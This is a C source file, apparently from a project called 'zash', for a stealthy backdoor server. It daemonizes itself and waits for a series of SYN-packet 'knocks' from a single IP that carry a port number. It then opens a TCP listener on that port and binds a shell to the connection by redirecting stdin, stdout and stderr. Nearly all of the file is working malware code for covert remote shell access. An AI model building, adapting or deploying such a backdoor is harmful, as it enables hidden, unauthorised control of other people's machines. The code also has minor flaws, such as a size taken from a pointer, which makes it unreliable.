//
// Created by user on 5/4/20.
//

#include <unistd.h>
#include <stdbool.h>

#include "common.h"
#include "config.h"
#include "daemon/daemon.h"
#include "socket/socket.h"
#include "shell/shell.h"

#include "server.h"

/* The maximum length of an ip4 text. */
#define SERVER_MAX_IP_LENGTH (16)


enum zash_status server_get_listening_port(struct SOCKET_syn_context *context,
                                           uint16_t port,
                                           uint16_t *listening_port)
{
    enum zash_status status = ZASH_STATUS_UNINITIALIZED;

    size_t amount_of_knocking = 0;
    char prev_ip[SERVER_MAX_IP_LENGTH] = {0};
    char ip[SERVER_MAX_IP_LENGTH] = {0};
    uint16_t temp_listening_port = 0;
    size_t data_len = 0;
    int strncmp_return_value = 0;

    /* Check for valid parameters */
    ASSERT(NULL != context);
    ASSERT(NULL != listening_port);

    while (amount_of_knocking < ZASH_NUMBER_OF_SYN_KNOCKS) {

        data_len = sizeof(listening_port);

        status = SOCKET_syn_receive(context, port, &data_len, (uint8_t *)&temp_listening_port, ip);
        if (ZASH_STATUS_SUCCESS != status) {
            DEBUG_PRINT("status: %d", status);
            goto lbl_cleanup;
        }

        strncmp_return_value = strncmp(ip, prev_ip, SERVER_MAX_IP_LENGTH);
        if (0 != strncmp_return_value) {
            amount_of_knocking = 0;
        }

        amount_of_knocking++;
        (void)strncpy(prev_ip, ip, SERVER_MAX_IP_LENGTH);

    }

    /* Transfer Ownership */
    *listening_port = temp_listening_port;

    /* Indicate Success */
    status = ZASH_STATUS_SUCCESS;

lbl_cleanup:

    return status;
}


enum zash_status server_run_shell(struct SHELL_context *shell, int fd_socket)
{
    enum zash_status status = ZASH_STATUS_UNINITIALIZED;

    int return_value = 0;

    /* Check for valid parameters */
    ASSERT(NULL != shell);

    return_value = dup2(fd_socket, STDIN_FILENO);
    if (C_STANDARD_FAILURE_VALUE == return_value) {
        status = ZASH_STATUS_SERVER_RUN_SHELL_DUP2_STDIN_FAILED;
        DEBUG_PRINT("status: %d", status);
        goto lbl_cleanup;
    }

    return_value = dup2(fd_socket, STDOUT_FILENO);
    if (C_STANDARD_FAILURE_VALUE == return_value) {
        status = ZASH_STATUS_SERVER_RUN_SHELL_DUP2_STDOUT_FAILED;
        DEBUG_PRINT("status: %d", status);
        goto lbl_cleanup;
    }

    return_value = dup2(fd_socket, STDERR_FILENO);
    if (C_STANDARD_FAILURE_VALUE == return_value) {
        status = ZASH_STATUS_SERVER_RUN_SHELL_DUP2_STDERR_FAILED;
        DEBUG_PRINT("status: %d", status);
        goto lbl_cleanup;
    }

    status = SHELL_run(shell);
    if (ZASH_STATUS_SUCCESS != status) {
        DEBUG_PRINT("status: %d", status);
        goto lbl_cleanup;
    }

    /* Indicate Success */
    status = ZASH_STATUS_SUCCESS;

lbl_cleanup:

    (void)close(STDOUT_FILENO);
    (void)close(STDIN_FILENO);

    return status;
}


enum zash_status SERVER_run(uint16_t port, char *interface)
{
    enum zash_status status = ZASH_STATUS_UNINITIALIZED;
    enum zash_status temp_status = ZASH_STATUS_UNINITIALIZED;

    struct SHELL_context *shell = NULL;
    struct SOCKET_syn_context *socket_context = NULL;
    uint16_t listening_port = 0;
    int fd_socket = INVALID_FILE_DESCRIPTOR;

    /* Check for valid parameters */
    if (NULL == interface) {
        status = ZASH_STATUS_SERVER_RUN_NULL_POINTER;
        DEBUG_PRINT("status: %d", status);
        goto lbl_cleanup;
    }

    status = DAEMON_daemonize();
    if (ZASH_STATUS_SUCCESS != status) {
        DEBUG_PRINT("status: %d", status);
        goto lbl_cleanup;
    }

    status = SHELL_create(&shell);
    if (ZASH_STATUS_SUCCESS != status) {
        DEBUG_PRINT("status: %d", status);
        goto lbl_cleanup;
    }

    status = SOCKET_syn_create(interface, &socket_context);
    if (ZASH_STATUS_SUCCESS != status) {
        DEBUG_PRINT("status: %d", status);
        goto lbl_cleanup;
    }

    while (true) {
        status = server_get_listening_port(socket_context, port, &listening_port);
        if (ZASH_STATUS_SUCCESS != status) {
            DEBUG_PRINT("status: %d", status);
            goto lbl_cleanup;
        }

        status = SOCKET_tcp_server(interface, listening_port, &fd_socket);
        if (ZASH_STATUS_SUCCESS != status) {
            DEBUG_PRINT("status: %d", status);
            goto lbl_cleanup;
        }

        status = server_run_shell(shell, fd_socket);
        if (ZASH_STATUS_SUCCESS != status) {
            DEBUG_PRINT("status: %d", status);
            goto lbl_cleanup;
        }
    }

    /* Indicate Success */
    status = ZASH_STATUS_SUCCESS;

lbl_cleanup:

    if (NULL != socket_context) {
        temp_status = SOCKET_syn_destroy(socket_context);
        ZASH_UPDATE_STATUS(status, temp_status);
    }

    if (NULL != shell) {
        temp_status = SHELL_destroy(shell);
        ZASH_UPDATE_STATUS(status, temp_status);
    }

    return status;
}

//TODO: remove main
void main(int argc, char *argv[]) {
    SERVER_run(2020, argv[1]);
}